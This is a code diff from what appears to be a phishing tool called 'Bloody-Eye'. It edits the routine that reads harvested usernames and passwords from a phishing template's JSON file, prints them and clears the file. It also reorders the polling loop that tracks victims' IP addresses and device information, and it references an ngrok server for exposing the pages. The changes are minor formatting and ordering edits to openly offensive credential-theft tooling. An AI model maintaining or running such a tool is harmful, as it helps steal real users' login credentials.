@@ -563,7 +563,6 @@ exit();""")
        ngrokserver()
 
        
- # Getting User And Password
     def userin():
         global stat_file
         if not str(os.stat("../Bloody-Eye/templates/phishing/usernames.json").st_size) == stat_file:
@@ -573,8 +572,8 @@ exit();""")
             try:
                 infor = json.loads(b)
                 for value in infor['dev']:
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+Fore.RED+" Username : "+Fore.WHITE+value['username'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+Fore.RED+" Password : "+Fore.WHITE+value["password"])
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Username : "+Fore.WHITE+value['username'])
+                    print("\n"+Fore.RED+" ["+Fore.WHITE+"+"+Fore.RED+"]"+" Password : "+Fore.WHITE+value["password"])
                     a = open("../Bloody-Eye/templates/phishing/usernames.json","w")
                     b = a.write("")
                     a.close()
@@ -614,17 +613,14 @@ exit();""")
                     b = a.write("")
                     a.close()
             except:
-                None    
+                None
     while True:
-          readip()
-          info()
-          userin()
-     
+        userin()
+        readip()
+        info()
   except:
     with open("exit","w") as kill:
       Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-      print("uhahahahahahahahahahahahahhahahaahah")
-      time.sleep(5)
       os.system("clear")
       sys.exit()
 
